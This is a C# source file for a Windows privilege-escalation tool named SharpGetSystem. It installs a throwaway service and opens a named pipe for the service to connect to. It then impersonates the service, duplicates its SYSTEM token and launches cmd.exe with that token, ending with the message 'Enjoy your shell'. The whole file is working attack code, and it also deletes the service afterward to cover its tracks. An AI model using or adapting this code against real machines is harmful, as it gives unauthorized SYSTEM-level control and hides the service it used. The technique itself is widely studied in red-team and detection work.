using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace SharpGetSystem_Console {
    class Program {

        static void Main(string[] args) {

            Guid g = Guid.NewGuid();

            string pipeName = @"\\.\\pipe\\4edb8323-a792-4b24-a865-1246ba3f015a"; // use dynamic one in the future
            string serviceName = g.ToString();

            // install service first
            Service.installService(serviceName, String.Format(@"{0}\SharpGetSystem-Service.exe", AppDomain.CurrentDomain.BaseDirectory));
            Service.manageService(serviceName, "start");

            Console.WriteLine("[+] Opening pipe ({0}) ", pipeName);

            IntPtr hPipe = Pinvoke.CreateNamedPipe(pipeName, 3, 0, 255, 1024, 1024, 0, IntPtr.Zero);

            if ((int)hPipe != -1) {

                Console.WriteLine("[+] Pipe created without errors!");
                Pinvoke.ConnectNamedPipe(hPipe, IntPtr.Zero);
                Console.WriteLine("[+] Connection received!");
                bool r = Pinvoke.ImpersonateNamedPipeClient(hPipe);

                // we dont need the service anymore
                Service.manageService(serviceName, "stop");
                Service.deleteService(serviceName);

                if (r) {
                    Console.WriteLine("[+] Success impersonating client!");
                    IntPtr hToken;

                    if (!Pinvoke.OpenThreadToken(Pinvoke.GetCurrentThread(), 0xF01FF, false, out hToken)) {
                        Console.WriteLine("[-] Error opening thread token ({0})!", System.Runtime.InteropServices.Marshal.GetLastWin32Error());
                    } else {
                        Console.WriteLine("[+] Got thread token without errors!");
                    }

                    string user = WindowsIdentity.GetCurrent().Name;
                    Pinvoke.RevertToSelf(); // revert since we already have token

                    IntPtr systemToken = IntPtr.Zero;

                    if (Pinvoke.DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out systemToken)) {
                        Console.WriteLine("[+] Success on duplicating token! ");
                        Console.WriteLine("[+] Opening cmd as {0} ", user);

                        Pinvoke.STARTUPINFO si = new Pinvoke.STARTUPINFO();
                        Pinvoke.PROCESS_INFORMATION pi = new Pinvoke.PROCESS_INFORMATION();

                        bool result = Pinvoke.CreateProcessWithTokenW(systemToken, 0x00000001, "C:\\Windows\\system32\\cmd.exe", null, 0x00000010, IntPtr.Zero, null, ref si, out pi);

                        if (result)
                            Console.WriteLine("[+] Enjoy your shell ;D");
                        else
                            Console.WriteLine("[-] Error creating process with token ({0})", System.Runtime.InteropServices.Marshal.GetLastWin32Error());


                    } else {
                        Console.WriteLine("[-] Error duplicating token ({0})!", System.Runtime.InteropServices.Marshal.GetLastWin32Error());
                    }

                }

            }

            Console.WriteLine("[-] Bye");
            Console.ReadKey();

        }
    }
}
